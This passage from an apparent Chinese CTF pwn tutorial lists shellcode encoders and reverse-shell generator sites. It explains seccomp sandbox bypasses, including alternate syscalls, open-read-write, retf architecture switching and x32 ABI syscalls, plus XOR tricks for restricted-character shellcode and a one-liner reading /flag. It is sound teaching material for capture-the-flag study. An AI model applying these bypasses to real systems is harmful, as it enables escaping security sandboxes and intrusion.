+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">bloxor</span>                    <span class="n">manual</span>     <span class="n">BloXor</span> <span class="o">-</span> <span class="n">A</span> <span class="n">Metamorphic</span> <span class="n">Block</span> <span class="n">Based</span> <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">bmp_polyglot</span>              <span class="n">manual</span>     <span class="n">BMP</span> <span class="n">Polyglot</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">call4_dword_xor</span>           <span class="n">normal</span>     <span class="n">Call</span><span class="o">+</span><span class="mi">4</span> <span class="n">Dword</span> <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">context_cpuid</span>             <span class="n">manual</span>     <span class="n">CPUID</span><span class="o">-</span><span class="n">based</span> <span class="n">Context</span> <span class="n">Keyed</span> <span class="n">Payload</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">context_stat</span>              <span class="n">manual</span>     <span class="n">stat</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="n">based</span> <span class="n">Context</span> <span class="n">Keyed</span> <span class="n">Payload</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">context_time</span>              <span class="n">manual</span>     <span class="n">time</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="n">based</span> <span class="n">Context</span> <span class="n">Keyed</span> <span class="n">Payload</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">countdown</span>                 <span class="n">normal</span>     <span class="n">Single</span><span class="o">-</span><span class="n">byte</span> <span class="n">XOR</span> <span class="n">Countdown</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">fnstenv_mov</span>               <span class="n">normal</span>     <span class="n">Variable</span><span class="o">-</span><span class="n">length</span> <span class="n">Fnstenv</span><span class="o">/</span><span class="n">mov</span> <span class="n">Dword</span> <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">jmp_call_additive</span>         <span class="n">normal</span>     <span class="n">Jump</span><span class="o">/</span><span class="n">Call</span> <span class="n">XOR</span> <span class="n">Additive</span> <span class="n">Feedback</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">nonalpha</span>                  <span class="n">low</span>        <span class="n">Non</span><span class="o">-</span><span class="n">Alpha</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">nonupper</span>                  <span class="n">low</span>        <span class="n">Non</span><span class="o">-</span><span class="n">Upper</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">opt_sub</span>                   <span class="n">manual</span>     <span class="n">Sub</span> <span class="n">Encoder</span> <span class="p">(</span><span class="n">optimised</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">service</span>                   <span class="n">manual</span>     <span class="n">Register</span> <span class="n">Service</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>            <span class="n">excellent</span>  <span class="n">Polymorphic</span> <span class="n">XOR</span> <span class="n">Additive</span> <span class="n">Feedback</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">single_static_bit</span>         <span class="n">manual</span>     <span class="n">Single</span> <span class="n">Static</span> <span class="n">Bit</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">unicode_mixed</span>             <span class="n">manual</span>     <span class="n">Alpha2</span> <span class="n">Alphanumeric</span> <span class="n">Unicode</span> <span class="n">Mixedcase</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">unicode_upper</span>             <span class="n">manual</span>     <span class="n">Alpha2</span> <span class="n">Alphanumeric</span> <span class="n">Unicode</span> <span class="n">Uppercase</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">xor_dynamic</span>               <span class="n">normal</span>     <span class="n">Dynamic</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">Encoder</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="1-3-在线网站"><span>1-3 在线网站</span>
+  <a href="#1-3-%e5%9c%a8%e7%ba%bf%e7%bd%91%e7%ab%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>搜集了一些非常有用的与<code>shellcode</code>相关的网站</p>
+<ol>
+<li><a href="https://defuse.ca/online-x86-assembler.htm"target="_blank" rel="external nofollow noopener noreferrer">Online x86 and x64 Intel Instruction Assembler (defuse.ca)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>: 在线编写<code>shellcode</code>和反汇编<code>shellcode</code>，目前只支持<code>x86/x64</code></li>
+<li><a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/"target="_blank" rel="external nofollow noopener noreferrer">Online Assembler and Disassembler (shell-storm.org)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>: 另一个更全的在线编写<code>shellcode</code>和反汇编<code>shellcode</code>网站</li>
+<li><a href="https://shell-storm.org/shellcode/index.html"target="_blank" rel="external nofollow noopener noreferrer">Shellcodes database for study cases (shell-storm.org)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>: <code>shellcode</code>数据库，支持很多指令集与操作系统</li>
+<li><a href="https://www.exploit-db.com/shellcodes"target="_blank" rel="external nofollow noopener noreferrer">Exploit Database Shellcodes (exploit-db.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>: 另一个<code>shellcode</code>数据库</li>
+<li><a href="https://www.revshells.com/"target="_blank" rel="external nofollow noopener noreferrer">Online - Reverse Shell Generator (revshells.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>: 生成反弹<code>shell</code>的命令</li>
+</ol>
+<h2 class="heading-element" id="2-突破沙箱规则"><span>2-突破沙箱规则</span>
+  <a href="#2-%e7%aa%81%e7%a0%b4%e6%b2%99%e7%ae%b1%e8%a7%84%e5%88%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>由于沙箱规则比较多，规则制定比较自由，所以下文重点探讨绕过的技术。</p>
+<h2 class="heading-element" id="2-1-使用atv2系统调用"><span>2-1 使用at/v/2系统调用</span>
+  <a href="#2-1-%e4%bd%bf%e7%94%a8atv2%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这里分别指的是几个系统调用的后缀和前缀，比如：</p>
+<ul>
+<li>使用<code>execveat</code>代替<code>execve</code>，拿到<code>shell</code>后，使用<code>shell</code>内置命令读取<code>flag</code>: <code>echo *; read FLAG &lt; /flag;echo $FLAG</code>，否则使用子<code>shell</code>执行命令还是会被沙箱杀死。同样的，使用<code>openat</code>代替<code>open</code>。</li>
+<li>使用<code>readv/writev</code>代替<code>read/write</code></li>
+<li>使用<code>mmap2</code>代替<code>mmap</code></li>
+<li>还有一些特殊的系统调用，使用<code>sendfile</code>，代替<code>read/write</code>。这类的系统调用需要平时多关注、收集和整理。</li>
+</ul>
+<h2 class="heading-element" id="2-2-使用orw读取flag"><span>2-2 使用orw读取flag</span>
+  <a href="#2-2-%e4%bd%bf%e7%94%a8orw%e8%af%bb%e5%8f%96flag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>一般来说，会禁止<code>system/execve/fork</code>等，这个时候使用<code>open+read+write</code>输出<code>flag</code>即可。</p>
+<p>或者使用<code>open+sendfile</code>，指令会更短。</p>
+<h2 class="heading-element" id="2-3-切换指令模式"><span>2-3 切换指令模式</span>
+  <a href="#2-3-%e5%88%87%e6%8d%a2%e6%8c%87%e4%bb%a4%e6%a8%a1%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>随便找一个<code>seccomp-tools</code>解析的沙箱规则：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ seccomp-tools dump ./pwn
+</span></span><span class="line"><span class="cl"> line  CODE  JT   JF      <span class="nv">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
+</span></span><span class="line"><span class="cl"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
+</span></span><span class="line"><span class="cl"> 0003: 0x35 0x06 0x00 0x40000000  <span class="k">if</span> <span class="o">(</span>A &gt;<span class="o">=</span> 0x40000000<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0004: 0x15 0x05 0x00 0x0000003b  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> execve<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0005: 0x15 0x04 0x00 0x00000142  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> execveat<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0006: 0x15 0x03 0x00 0x00000039  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> fork<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0007: 0x15 0x02 0x00 0x00000038  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> clone<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0008: 0x15 0x01 0x00 0x0000000f  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> rt_sigreturn<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0010: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个沙箱规则判断了当前触发系统调用的时候，<code>arch</code>是否为<code>x64</code>，如果不是<code>64</code>就会<code>kill</code>；然后，判断了<code>sys-number</code>是否大于等于<code>0x40000000</code>，如果大于，程序也会被<code>kill</code>；然后设置了黑名单，分别是：<code>execve/execveat/fork/clone/rt_sigreturn</code>。处于黑名单的系统调用会被<code>kill</code>掉，其他系统调用则会放行。</p>
+<p>如果没有<code> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</code>这一句的检查，那么可以使用<code>retf(return far)</code>指令实现架构切换，或者在<code>x64</code>环境下直接调用<code>int 0x80</code>陷入到内核态。</p>
+<p><code>retf</code>相当于<code>pop ip; pop cs</code>，<code>cs</code>是段寄存器，寄存器为<code>0x23</code>时表示<code>32</code>位运行模式，<code>0x33</code>表示<code>64</code>位运行模式。</p>
+<p>从<code>64</code>位切换到<code>32</code>位的模板如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xor esp, esp
+</span></span><span class="line"><span class="cl">mov rsp, 0x400100
+</span></span><span class="line"><span class="cl">mov eax, 0x23 ; cs
+</span></span><span class="line"><span class="cl">mov [rsp+4], eax
+</span></span><span class="line"><span class="cl">mov eax, 0x400800 ; ip
+</span></span><span class="line"><span class="cl">mov [rsp], eax
+</span></span><span class="line"><span class="cl">retf</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="2-4-使用0x40000000x系统调用"><span>2-4 使用0x40000000+X系统调用</span>
+  <a href="#2-4-%e4%bd%bf%e7%94%a80x40000000x%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>接着<code>2-3</code>，如果没有限制：<code> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010</code>的话，那么可以使用<code>0x40000000 + X</code>来执行系统调用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define __X32_SYSCALL_BIT	0x40000000UL</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>关于<code>x32 ABI</code>可查看<a href="https://en.wikipedia.org/wiki/X32_ABI"target="_blank" rel="external nofollow noopener noreferrer">x32 ABI - Wikipedia<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
+<p>比如要执行<code>read</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xor eax, eax
+</span></span><span class="line"><span class="cl">add eax, 0x40000000
+</span></span><span class="line"><span class="cl">xor edi, edi
+</span></span><span class="line"><span class="cl">mov rsi, rsp
+</span></span><span class="line"><span class="cl">mov edx, 0x300
+</span></span><span class="line"><span class="cl">syscall</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要注意的是，从<code>5.16</code>开始，<code>linux</code>内核不支持<code>x32 abi</code>了：<a href="https://bugs.launchpad.net/ubuntu/&#43;source/linux/&#43;bug/1994516"target="_blank" rel="external nofollow noopener noreferrer">Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries&hellip;” : Bugs : linux package : Ubuntu (launchpad.net)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<h2 class="heading-element" id="2-5-使用-io_uring-系统调用"><span>2-5 使用 Io_uring 系统调用</span>
+  <a href="#2-5-%e4%bd%bf%e7%94%a8-io_uring-%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>最近 <code>io_uring</code> 系统调用受到了广泛关注，因为这个系统调用几乎可抵千军万马。</p>
+<p>特别的，高版本 (<code>Linux Kernel Version &gt;= 6.5</code>) 的 <code>io_uring</code> 中引入了 <code>IORING_SETUP_NO_MMAP</code> 标志，配合 <code>IORING_SETUP_SQPOLL</code> 可以一次 <code>syscall</code> 完成 <code>orw</code> 操作。</p>
+<h2 class="heading-element" id="3-字符型shellcode"><span>3-字符型shellcode</span>
+  <a href="#3-%e5%ad%97%e7%ac%a6%e5%9e%8bshellcode" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 class="heading-element" id="3-1-可打印字符"><span>3-1 可打印字符</span>
+  <a href="#3-1-%e5%8f%af%e6%89%93%e5%8d%b0%e5%ad%97%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>关于<code>ascii shellcode</code>，这篇博客必看：<a href="https://nets.ec/Ascii_shellcode"target="_blank" rel="external nofollow noopener noreferrer">Ascii shellcode - NetSec<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
+<p>如果要求是可打印字符，直接使用上面提到的<code>alpha3/ae64</code>等工具生成即可。</p>
+<h2 class="heading-element" id="3-2-字母和数字"><span>3-2 字母和数字</span>
+  <a href="#3-2-%e5%ad%97%e6%af%8d%e5%92%8c%e6%95%b0%e5%ad%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>同上，直接使用上面提到的<code>alpha3/ae64</code>等工具生成即可。</p>
+<h2 class="heading-element" id="3-3-限制字母和数字"><span>3-3 限制字母和数字</span>
+  <a href="#3-3-%e9%99%90%e5%88%b6%e5%ad%97%e6%af%8d%e5%92%8c%e6%95%b0%e5%ad%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>很多时候，会限制为纯小写字母或者部分字母或者部分数字。这个时候，需要根据限制条件，把能用的<code>shellcode</code>组合梳理出来，然后结合<code>shellcode</code>的执行地址，利用<code>xor/add</code>等指令，构造出其他所需要的指令。</p>
+<p>举个例子，假如<code>shellcode</code>执行地址<code>0x333100</code>，只能用<code>0x30-0x40</code>编写<code>shellcode</code>，如果需要<code>\x0f\x05</code>，可以用异或：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xor eax, 0x33333130; 3530313333
+</span></span><span class="line"><span class="cl">xor eax, 0x3333343f; 353f343333
+</span></span><span class="line"><span class="cl">;此时，eax就成为0x050f了</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以用<code>pwntools</code>的<code>disasm</code>爆破所有可能的<code>shellcode</code>组合：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
